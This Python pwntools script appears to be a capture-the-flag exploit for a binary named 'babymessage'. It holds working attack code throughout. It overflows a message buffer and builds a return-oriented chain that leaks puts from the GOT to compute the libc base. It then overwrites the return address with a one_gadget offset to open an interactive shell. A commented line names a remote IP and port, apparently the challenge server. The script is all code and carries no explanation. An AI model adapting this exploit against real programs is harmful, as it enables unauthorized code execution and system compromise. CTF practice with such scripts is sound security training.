#coding:UTF-8
from pwn import *
# context.log_level = 'debug'
#p = remote('123.56.170.202',21342)
elf = ELF('./babymessage')
p = elf.process()
libc = ELF('./libc-2.27.so')
work_addr = elf.symbols['main']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
rdi_ret = 0x400ac3
payload = 'A'*0x8+ p64(0x6010D4)
p.sendlineafter('choice:','1')
p.sendafter('name:',p32(0xf000050))
p.sendlineafter('choice:','2')
p.sendafter('message:',payload)
#gdb.attach(p)
p.sendlineafter('choice:','2')
payload_2 = 'A'*0x8
payload_2 += p64(0x6010D4)
payload_2 += p64(rdi_ret)
payload_2 += p64(puts_got)
payload_2 += p64(puts_plt)
payload_2 += p64(work_addr)
p.sendlineafter('message:',payload_2)
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = puts_addr- libc.sym['puts']
log.info('libc_base:'+hex(libc_base))
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search('/bin/sh').next()
p.sendlineafter('choice:','1')
p.sendafter('name:',p32(0xf000050))
p.sendlineafter('choice:','2')
p.sendafter('message:',payload)
p.sendlineafter('choice:','2')
payload = 'A' * 0x10
payload += p64(libc_base+0x4f365)
p.sendafter('message:',payload)
p.interactive()
